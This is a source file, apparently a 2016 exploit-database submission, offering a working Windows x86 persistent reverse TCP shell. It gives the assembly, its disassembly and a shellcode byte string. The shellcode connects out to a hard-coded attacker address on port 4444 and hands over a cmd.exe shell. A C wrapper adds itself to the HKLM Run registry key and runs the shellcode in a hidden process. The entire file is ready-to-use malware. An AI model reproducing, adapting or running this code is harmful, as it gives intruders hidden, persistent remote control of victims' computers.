/*
	# Title : Windows x86 persistent reverse shell tcp
	# Author : Roziul Hasan Khan Shifat
	# Date : 04-09-2016
	# Tested on : Windows 7 x86
*/


/*
Note : This program must be run as adminstrator for 1st time . otherwise it won't be persistent
*/


/*
section .text
	global _start
_start:


xor ecx,ecx
mov eax,[fs:ecx+0x30] ;PEB
mov eax,[eax+0xc] ;PEB->Ldr
mov esi,[eax+0x14] ;PEB->ldr.InMemOrderModuleList
lodsd
xchg esi,eax
lodsd
mov ecx,[eax+0x10] ;kernel32.dll


mov ebx,[ecx+0x3c] ;DOS->elf_anew
add ebx,ecx ;PE HEADER
mov ebx,[ebx+0x78] ;DataDirectory->VirtualAddress
add ebx,ecx ;IMAGE_EXPORT_DIRECTORY

mov esi,[ebx+0x20] ;AddressOfNames
add esi,ecx


xor edx,edx

g:

inc edx
lodsd
add eax,ecx
cmp dword [eax],'GetP'
jne g
cmp dword [eax+4],'rocA'
jne g
cmp dword [eax+8],'ddre'
jne g

mov esi,[ebx+0x1c] ;AddressOfFunctions
add esi,ecx


mov edx,[esi+edx*4]
add edx,ecx ;GetProcAddress()

xor eax,eax
push eax

sub esp,24

lea esi,[esp]

mov [esi],dword edx ;GetProcAddress() at offset 0
mov edi,ecx ;kernel32.dll

;------------------------------
;finding address of CreateProcessA()

push 0x42424173
mov [esp+2],word ax
push 0x7365636f
push 0x72506574
push 0x61657243

lea eax,[esp]

push eax
push ecx

call edx
;----------------------------
add esp,16

mov [esi+4],dword eax ;CreateProcessA() at offset 4
;-----------------------------
;finding address of ExitProcess()
xor ecx,ecx
push 0x41737365
mov [esp+3],byte cl
push 0x636f7250
push 0x74697845

lea ecx,[esp]

push ecx
push edi

call dword [esi]

add esp,12

mov [esi+8],dword eax ;ExitProcess() at offset 8
;-----------------------------------------------------
;loading ws2_32.dll


xor ecx,ecx
push ecx
push 0x41797261
push 0x7262694c
push 0x64616f4c

lea ecx,[esp]

push ecx
push edi

call dword [esi]

add esp,12

xor ecx,ecx
push 0x41416c6c
mov [esp+2],word cx
push 0x642e3233
push 0x5f327377
lea ecx,[esp]

push ecx
call eax
add esp,8

mov edi,eax ;ws2_32.dll

;-----------------------------------
;finding address of WSAStartup()
xor ecx,ecx
push 0x41417075
mov [esp+2],word cx
push 0x74726174
push 0x53415357

lea ecx,[esp]
push ecx
push eax

call dword [esi]
add esp,12

mov [esi+12],dword eax ;WSAStartup() at offset 12

;------------------------------------------
;finding address of WSASocketA()

xor ecx,ecx
push 0x42424174
mov [esp+2],word cx
push 0x656b636f
push 0x53415357

lea ecx,[esp]

push ecx
push edi

call dword [esi]
add esp,12

mov [esi+16],dword eax ;WSASocketA() at offset 16
;-----------------------------
;finding address of WSAConnect()
xor ecx,ecx
push 0x41417463
mov [esp+2],word cx
push 0x656e6e6f
push 0x43415357

lea ecx,[esp]

push ecx
push edi

call dword [esi]
add esp,12

mov [esi+20],dword eax ;WSAConnect() at offset 20
;------------------------------------------------

;WSAStartup(514, &WSADATA)

xor ecx,ecx
push ecx
mov cx,400

sub esp,ecx

lea ecx,[esp]

xor ebx,ebx
mov bx,514

push ecx
push ebx

call dword [esi+12]

;-------------------------------

;WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,NULL,NULL)

xor ecx,ecx
push ecx
push ecx
push ecx

mov cl,6
push ecx

sub ecx,5
push ecx

inc ecx
push ecx

call dword [esi+16]

xchg edi,eax ;SOCKET

;--------------------------------------------------
;WSAConnect(Winsock,(SOCKADDR*)&hax,sizeof(hax),NULL,NULL,NULL,NULL)
xor ecx,ecx
push ecx
push ecx
push ecx
push ecx

mov [esp],byte 2
mov [esp+2],word 0x5c11 ;port 4444 (change it if U want)
mov [esp+4],dword 0x81e8a8c0 ;Change it

connect:
xor ecx,ecx
lea ebx,[esp]

push ecx
push ecx
push ecx
push ecx


mov cl,16


push ecx
push ebx
push edi

call dword [esi+20]
xor ecx,ecx

cmp eax,ecx
jnz connect
;----------------------------------------------

xor ecx,ecx

sub esp,16
lea edx,[esp] ;PROCESS_INFORMATION

push edi
push edi
push edi
push ecx
push word cx
push word cx

mov cl,255
inc ecx

push ecx
xor ecx,ecx

push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx

mov cl,68

push ecx

lea ecx,[esp]


xor edx,edx
push 0x41657865
mov [esp+3],byte dl
push 0x2e646d63

lea edx,[esp]
;-----------------------------
;CreateProcessA(NULL,"cmd.exe",NULL,NULL,TRUE,0,NULL,NULL,&ini_processo,&processo_info)

push ebx
push ecx

xor ecx,ecx

push ecx
push ecx
push ecx

inc ecx
push ecx
xor ecx,ecx

push ecx
push ecx
push edx
push ecx

call dword [esi+4]

push eax
call dword [esi+8]
*/


/*
Disassembly of section .text:

00000000 <_start>:
   0:	31 c9                	xor    %ecx,%ecx
   2:	64 8b 41 30          	mov    %fs:0x30(%ecx),%eax
   6:	8b 40 0c             	mov    0xc(%eax),%eax
   9:	8b 70 14             	mov    0x14(%eax),%esi
   c:	ad                   	lods   %ds:(%esi),%eax
   d:	96                   	xchg   %eax,%esi
   e:	ad                   	lods   %ds:(%esi),%eax
   f:	8b 48 10             	mov    0x10(%eax),%ecx
  12:	8b 59 3c             	mov    0x3c(%ecx),%ebx
  15:	01 cb                	add    %ecx,%ebx
  17:	8b 5b 78             	mov    0x78(%ebx),%ebx
  1a:	01 cb                	add    %ecx,%ebx
  1c:	8b 73 20             	mov    0x20(%ebx),%esi
  1f:	01 ce                	add    %ecx,%esi
  21:	31 d2                	xor    %edx,%edx

00000023 <g>:
  23:	42                   	inc    %edx
  24:	ad                   	lods   %ds:(%esi),%eax
  25:	01 c8                	add    %ecx,%eax
  27:	81 38 47 65 74 50    	cmpl   $0x50746547,(%eax)
  2d:	75 f4                	jne    23 <g>
  2f:	81 78 04 72 6f 63 41 	cmpl   $0x41636f72,0x4(%eax)
  36:	75 eb                	jne    23 <g>
  38:	81 78 08 64 64 72 65 	cmpl   $0x65726464,0x8(%eax)
  3f:	75 e2                	jne    23 <g>
  41:	8b 73 1c             	mov    0x1c(%ebx),%esi
  44:	01 ce                	add    %ecx,%esi
  46:	8b 14 96             	mov    (%esi,%edx,4),%edx
  49:	01 ca                	add    %ecx,%edx
  4b:	31 c0                	xor    %eax,%eax
  4d:	50                   	push   %eax
  4e:	83 ec 18             	sub    $0x18,%esp
  51:	8d 34 24             	lea    (%esp),%esi
  54:	89 16                	mov    %edx,(%esi)
  56:	89 cf                	mov    %ecx,%edi
  58:	68 73 41 42 42       	push   $0x42424173
  5d:	66 89 44 24 02       	mov    %ax,0x2(%esp)
  62:	68 6f 63 65 73       	push   $0x7365636f
  67:	68 74 65 50 72       	push   $0x72506574
  6c:	68 43 72 65 61       	push   $0x61657243
  71:	8d 04 24             	lea    (%esp),%eax
  74:	50                   	push   %eax
  75:	51                   	push   %ecx
  76:	ff d2                	call   *%edx
  78:	83 c4 10             	add    $0x10,%esp
  7b:	89 46 04             	mov    %eax,0x4(%esi)
  7e:	31 c9                	xor    %ecx,%ecx
  80:	68 65 73 73 41       	push   $0x41737365
  85:	88 4c 24 03          	mov    %cl,0x3(%esp)
  89:	68 50 72 6f 63       	push   $0x636f7250
  8e:	68 45 78 69 74       	push   $0x74697845
  93:	8d 0c 24             	lea    (%esp),%ecx
  96:	51                   	push   %ecx
  97:	57                   	push   %edi
  98:	ff 16                	call   *(%esi)
  9a:	83 c4 0c             	add    $0xc,%esp
  9d:	89 46 08             	mov    %eax,0x8(%esi)
  a0:	31 c9                	xor    %ecx,%ecx
  a2:	51                   	push   %ecx
  a3:	68 61 72 79 41       	push   $0x41797261
  a8:	68 4c 69 62 72       	push   $0x7262694c
  ad:	68 4c 6f 61 64       	push   $0x64616f4c
  b2:	8d 0c 24             	lea    (%esp),%ecx
  b5:	51                   	push   %ecx
  b6:	57                   	push   %edi
  b7:	ff 16                	call   *(%esi)
  b9:	83 c4 0c             	add    $0xc,%esp
  bc:	31 c9                	xor    %ecx,%ecx
  be:	68 6c 6c 41 41       	push   $0x41416c6c
  c3:	66 89 4c 24 02       	mov    %cx,0x2(%esp)
  c8:	68 33 32 2e 64       	push   $0x642e3233
  cd:	68 77 73 32 5f       	push   $0x5f327377
  d2:	8d 0c 24             	lea    (%esp),%ecx
  d5:	51                   	push   %ecx
  d6:	ff d0                	call   *%eax
  d8:	83 c4 08             	add    $0x8,%esp
  db:	89 c7                	mov    %eax,%edi
  dd:	31 c9                	xor    %ecx,%ecx
  df:	68 75 70 41 41       	push   $0x41417075
  e4:	66 89 4c 24 02       	mov    %cx,0x2(%esp)
  e9:	68 74 61 72 74       	push   $0x74726174
  ee:	68 57 53 41 53       	push   $0x53415357
  f3:	8d 0c 24             	lea    (%esp),%ecx
  f6:	51                   	push   %ecx
  f7:	50                   	push   %eax
  f8:	ff 16                	call   *(%esi)
  fa:	83 c4 0c             	add    $0xc,%esp
  fd:	89 46 0c             	mov    %eax,0xc(%esi)
 100:	31 c9                	xor    %ecx,%ecx
 102:	68 74 41 42 42       	push   $0x42424174
 107:	66 89 4c 24 02       	mov    %cx,0x2(%esp)
 10c:	68 6f 63 6b 65       	push   $0x656b636f
 111:	68 57 53 41 53       	push   $0x53415357
 116:	8d 0c 24             	lea    (%esp),%ecx
 119:	51                   	push   %ecx
 11a:	57                   	push   %edi
 11b:	ff 16                	call   *(%esi)
 11d:	83 c4 0c             	add    $0xc,%esp
 120:	89 46 10             	mov    %eax,0x10(%esi)
 123:	31 c9                	xor    %ecx,%ecx
 125:	68 63 74 41 41       	push   $0x41417463
 12a:	66 89 4c 24 02       	mov    %cx,0x2(%esp)
 12f:	68 6f 6e 6e 65       	push   $0x656e6e6f
 134:	68 57 53 41 43       	push   $0x43415357
 139:	8d 0c 24             	lea    (%esp),%ecx
 13c:	51                   	push   %ecx
 13d:	57                   	push   %edi
 13e:	ff 16                	call   *(%esi)
 140:	83 c4 0c             	add    $0xc,%esp
 143:	89 46 14             	mov    %eax,0x14(%esi)
 146:	31 c9                	xor    %ecx,%ecx
 148:	51                   	push   %ecx
 149:	66 b9 90 01          	mov    $0x190,%cx
 14d:	29 cc                	sub    %ecx,%esp
 14f:	8d 0c 24             	lea    (%esp),%ecx
 152:	31 db                	xor    %ebx,%ebx
 154:	66 bb 02 02          	mov    $0x202,%bx
 158:	51                   	push   %ecx
 159:	53                   	push   %ebx
 15a:	ff 56 0c             	call   *0xc(%esi)
 15d:	31 c9                	xor    %ecx,%ecx
 15f:	51                   	push   %ecx
 160:	51                   	push   %ecx
 161:	51                   	push   %ecx
 162:	b1 06                	mov    $0x6,%cl
 164:	51                   	push   %ecx
 165:	83 e9 05             	sub    $0x5,%ecx
 168:	51                   	push   %ecx
 169:	41                   	inc    %ecx
 16a:	51                   	push   %ecx
 16b:	ff 56 10             	call   *0x10(%esi)
 16e:	97                   	xchg   %eax,%edi
 16f:	31 c9                	xor    %ecx,%ecx
 171:	51                   	push   %ecx
 172:	51                   	push   %ecx
 173:	51                   	push   %ecx
 174:	51                   	push   %ecx
 175:	c6 04 24 02          	movb   $0x2,(%esp)
 179:	66 c7 44 24 02 11 5c 	movw   $0x5c11,0x2(%esp)
 180:	c7 44 24 04 c0 a8 e8 	movl   $0x81e8a8c0,0x4(%esp)
 187:	81

00000188 <connect>:
 188:	31 c9                	xor    %ecx,%ecx
 18a:	8d 1c 24             	lea    (%esp),%ebx
 18d:	51                   	push   %ecx
 18e:	51                   	push   %ecx
 18f:	51                   	push   %ecx
 190:	51                   	push   %ecx
 191:	b1 10                	mov    $0x10,%cl
 193:	51                   	push   %ecx
 194:	53                   	push   %ebx
 195:	57                   	push   %edi
 196:	ff 56 14             	call   *0x14(%esi)
 199:	31 c9                	xor    %ecx,%ecx
 19b:	39 c8                	cmp    %ecx,%eax
 19d:	75 e9                	jne    188 <connect>
 19f:	31 c9                	xor    %ecx,%ecx
 1a1:	83 ec 10             	sub    $0x10,%esp
 1a4:	8d 14 24             	lea    (%esp),%edx
 1a7:	57                   	push   %edi
 1a8:	57                   	push   %edi
 1a9:	57                   	push   %edi
 1aa:	51                   	push   %ecx
 1ab:	66 51                	push   %cx
 1ad:	66 51                	push   %cx
 1af:	b1 ff                	mov    $0xff,%cl
 1b1:	41                   	inc    %ecx
 1b2:	51                   	push   %ecx
 1b3:	31 c9                	xor    %ecx,%ecx
 1b5:	51                   	push   %ecx
 1b6:	51                   	push   %ecx
 1b7:	51                   	push   %ecx
 1b8:	51                   	push   %ecx
 1b9:	51                   	push   %ecx
 1ba:	51                   	push   %ecx
 1bb:	51                   	push   %ecx
 1bc:	51                   	push   %ecx
 1bd:	51                   	push   %ecx
 1be:	51                   	push   %ecx
 1bf:	b1 44                	mov    $0x44,%cl
 1c1:	51                   	push   %ecx
 1c2:	8d 0c 24             	lea    (%esp),%ecx
 1c5:	31 d2                	xor    %edx,%edx
 1c7:	68 65 78 65 41       	push   $0x41657865
 1cc:	88 54 24 03          	mov    %dl,0x3(%esp)
 1d0:	68 63 6d 64 2e       	push   $0x2e646d63
 1d5:	8d 14 24             	lea    (%esp),%edx
 1d8:	53                   	push   %ebx
 1d9:	51                   	push   %ecx
 1da:	31 c9                	xor    %ecx,%ecx
 1dc:	51                   	push   %ecx
 1dd:	51                   	push   %ecx
 1de:	51                   	push   %ecx
 1df:	41                   	inc    %ecx
 1e0:	51                   	push   %ecx
 1e1:	31 c9                	xor    %ecx,%ecx
 1e3:	51                   	push   %ecx
 1e4:	51                   	push   %ecx
 1e5:	52                   	push   %edx
 1e6:	51                   	push   %ecx
 1e7:	ff 56 04             	call   *0x4(%esi)
 1ea:	50                   	push   %eax
 1eb:	ff 56 08             	call   *0x8(%esi)
*/


#include<stdio.h>
#include<windows.h>
#include<string.h>

char shellcode[]=\

"\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x48\x10\x8b\x59\x3c\x01\xcb\x8b\x5b\x78\x01\xcb\x8b\x73\x20\x01\xce\x31\xd2\x42\xad\x01\xc8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x73\x1c\x01\xce\x8b\x14\x96\x01\xca\x31\xc0\x50\x83\xec\x18\x8d\x34\x24\x89\x16\x89\xcf\x68\x73\x41\x42\x42\x66\x89\x44\x24\x02\x68\x6f\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43\x72\x65\x61\x8d\x04\x24\x50\x51\xff\xd2\x83\xc4\x10\x89\x46\x04\x31\xc9\x68\x65\x73\x73\x41\x88\x4c\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x8d\x0c\x24\x51\x57\xff\x16\x83\xc4\x0c\x89\x46\x08\x31\xc9\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x8d\x0c\x24\x51\x57\xff\x16\x83\xc4\x0c\x31\xc9\x68\x6c\x6c\x41\x41\x66\x89\x4c\x24\x02\x68\x33\x32\x2e\x64\x68\x77\x73\x32\x5f\x8d\x0c\x24\x51\xff\xd0\x83\xc4\x08\x89\xc7\x31\xc9\x68\x75\x70\x41\x41\x66\x89\x4c\x24\x02\x68\x74\x61\x72\x74\x68\x57\x53\x41\x53\x8d\x0c\x24\x51\x50\xff\x16\x83\xc4\x0c\x89\x46\x0c\x31\xc9\x68\x74\x41\x42\x42\x66\x89\x4c\x24\x02\x68\x6f\x63\x6b\x65\x68\x57\x53\x41\x53\x8d\x0c\x24\x51\x57\xff\x16\x83\xc4\x0c\x89\x46\x10\x31\xc9\x68\x63\x74\x41\x41\x66\x89\x4c\x24\x02\x68\x6f\x6e\x6e\x65\x68\x57\x53\x41\x43\x8d\x0c\x24\x51\x57\xff\x16\x83\xc4\x0c\x89\x46\x14\x31\xc9\x51\x66\xb9\x90\x01\x29\xcc\x8d\x0c\x24\x31\xdb\x66\xbb\x02\x02\x51\x53\xff\x56\x0c\x31\xc9\x51\x51\x51\xb1\x06\x51\x83\xe9\x05\x51\x41\x51\xff\x56\x10\x97\x31\xc9\x51\x51\x51\x51\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x11\x5c\xc7\x44\x24\x04\xc0\xa8\xe8\x81\x31\xc9\x8d\x1c\x24\x51\x51\x51\x51\xb1\x10\x51\x53\x57\xff\x56\x14\x31\xc9\x39\xc8\x75\xe9\x31\xc9\x83\xec\x10\x8d\x14\x24\x57\x57\x57\x51\x66\x51\x66\x51\xb1\xff\x41\x51\x31\xc9\x51\x51\x51\x51\x51\x51\x51\x51\x51\x51\xb1\x44\x51\x8d\x0c\x24\x31\xd2\x68\x65\x78\x65\x41\x88\x54\x24\x03\x68\x63\x6d\x64\x2e\x8d\x14\x24\x53\x51\x31\xc9\x51\x51\x51\x41\x51\x31\xc9\x51\x51\x52\x51\xff\x56\x04\x50\xff\x56\x08";

int main(int li,char *a[])
{
char info[200];
DWORD l;
HKEY i;


	 RegOpenKeyA(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",&i);
  int r= RegQueryValueExA(i,"reverse_shell_tcp",0,NULL,(LPBYTE)info,&l);

   if(i!=0)
   {
   	RegSetValueExA(i,"reverse_shell_tcp",0,REG_SZ,a[0],strlen(a[0]));
   	RegCloseKey(i);
   }
   else
   RegCloseKey(i);




 	int mode;



	if(li==1)
	mode=1;
	else
	mode=atoi(a[1]);

switch(mode)
{



	case 78:
	(* (int(*)())shellcode )();
	break;

	case 1:
	default:
		ShellExecute(NULL,NULL,a[0],"78",NULL,0);
	break;
}


   return 0;

}